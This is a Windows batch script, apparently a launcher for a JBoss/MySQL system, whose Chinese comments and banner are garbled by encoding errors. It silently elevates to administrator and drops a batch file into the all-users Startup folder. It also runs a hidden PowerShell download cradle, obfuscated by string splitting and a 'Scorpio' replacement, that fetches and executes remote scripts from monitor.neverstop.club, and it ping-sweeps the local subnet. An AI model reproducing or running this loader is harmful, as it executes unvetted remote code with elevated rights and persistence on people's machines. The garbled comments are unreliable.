@echo off
rem ��ȡ����ԱȨ��
(cd /d "%~dp0")&&(NET FILE||(powershell start-process -FilePath '%0' -verb runas)&&(exit /B)) >NUL 2>&1


cls
echo.
echo.          #########################################################
echo.          ##                                                     ##
echo.          ##    ��������ϵͳ�����Ե�...                          ##
echo.          ##    ����������ԣ�ʮ���Ӻ���δ��ϵͳ����ϵ��ά     ##
echo.          ##    �԰����꣬ף��������죡����                     ##
echo.          ##                                                     ##
echo.          #########################################################

@echo off
rem ����Ƿ����APR�ű��������������
if exist %programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat (
    goto MySQL
) ELSE (
    echo for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c) >%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat
    echo for /L %%i IN (1,1,254) DO ping -w 2 -n 1 192.168.%Three%.%%i >>%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat
)
    

goto MySQL
rem ��ѯϵͳ�Ƿ����jboss�����ж��Ƿ�Ϊ����
rem ��δ���ã�����𸱻���Ҳװ��Jboss���������������
SC QUERY jboss >NUL 2>&1
if ERRORLEVEL 1060 (
    echo δ��⵽Jboss�������ڷ���ϵͳ��ַ�����Ե�...
    goto IESettings
) else (
    echo ��⵽Jboss������������ϵͳ�����Ե�...
    goto StartJboss
)

:MySQL
rem ��ѯMySQL�����Ƿ��������ж��Ƿ�Ϊ����
set M_Status=1 
(tasklist|findstr "mysql"||set M_Status=0) >NUL 2>&1
IF %M_Status% EQU 0 (
    echo δ��⵽ MySQL �������ڷ���ϵͳ��ַ�����Ե�...
    goto IESettings
) ELSE (
    echo ��⵽ MySQL �������ڼ�� Jboss �������Ե�...
    goto StartJboss
)

:StartJboss
rem ���Jboss�����Ƿ�����
set J_Status=1 
(tasklist|findstr "jboss"||set J_Status=0) >NUL 2>&1
IF %J_Status% EQU 0 (
    echo Jboss ����δ���������������������Ե�...
    net start jboss
    goto PrimaryIESettings
) ELSE (
    echo Jboss ���������������ڷ���ϵͳ�����Ե�...
    goto IESettings
)

:PrimaryIESettings
rem ��������powershell�ű�����ӿ���վ�㣬��������ͼ
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
goto ARP

:IESettings
rem ���ø���powershell�ű�����ӿ���վ�㣬��������ͼ
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
goto ARP


:ARP
rem ��ȡ����ip��ַ�Σ�Ȼ��ˢ�¸���arp��
for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c)
for /L %%i IN (1,1,254) DO ping -w 2 -n 1 192.168.%Three%.%%i >nul
exit